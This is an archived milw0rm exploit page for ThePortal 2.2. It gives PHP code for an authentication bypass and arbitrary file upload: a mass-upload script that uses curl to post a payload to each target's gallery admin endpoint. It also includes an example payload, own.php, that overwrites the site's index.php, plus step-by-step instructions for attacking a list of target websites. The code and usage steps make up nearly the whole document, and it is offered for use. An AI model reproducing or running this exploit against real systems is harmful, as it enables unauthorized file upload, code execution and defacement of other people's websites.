<html><head><title>ThePortal 2.2 Arbitrary Remote File Upload Exploit</title></head><pre>[ web apps] theportal2 v2.2 (Auth bypass) file upload
--------------------
Author: siurek22
-------------------- 

You need curl to run it

--------------------
Code:
--------------------
upload.php


&lt;?php
$file=$_POST['url'];
$fel=explode(&quot;\n&quot;, $file);




$ile=count($fel);
if(empty($file))
{
 echo'&lt;br&gt;&lt;br&gt;&lt;br&gt;
                                               &lt;center&gt;
                                               &lt;form method=&quot;post&quot;&gt;
                                               &lt;textarea type=&quot;text&quot; name=&quot;url&quot; cols=&quot;50&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;
                                               &lt;input type=&quot;submit&quot; value=&quot;OWNED&quot;&gt;
                                               &lt;/form&gt;
';
}
else{
for($i=0; $i&lt;$ile;$i++)
{
$url=$fel[$i];
$url2=$url.&quot;/admin/galeria.php?akcja=dodaj_foto&quot;;
$url5=$url.&quot;/galeria/own.php&quot;;
                $c = curl_init();
                $postFields['adres'] = '@' . dirname(__FILE__) . '/own.php';
                $postFields['tytul'] = 'us';
                $postFields['opis'] = 'us';
                $postFields['kategoria'] = 1;
                $postFields['B1'] = 'dodaj';
                curl_setopt($c, CURLOPT_URL, $url2);
                curl_setopt($c, CURLOPT_POST, 1);
                curl_setopt($c, CURLOPT_POSTFIELDS, $postFields);
                curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
                $odpowiedz3=curl_exec($c);

                curl_close($c);
}
}              
?&gt;

------------
 „own.php” with your code php
Example:

&lt;?php
$text=&quot;&lt;?php die(\&quot;OWNED...\&quot;); ?&gt;&quot;;
$adres=$_SERVER['SCRIPT_FILENAME'];
$adres=str_replace(&quot;own.php&quot;,&quot;&quot;,$adres);
$adres=substr($adres,0, -8);
$adres=$adres.&quot;index.php&quot;;
$fp=fopen($adres,&quot;w&quot;);
fwrite($fp, $text);
fclose($fp);

?&gt;

Example:
1 Put upload.php and own.php at server
2 Go to url yourserver.com/upload.php and put to the textarea adres of website and Click OWNED
3 Now go to url your file target.com/galeria/own.php

# milw0rm.com [2008-12-29]</pre></html>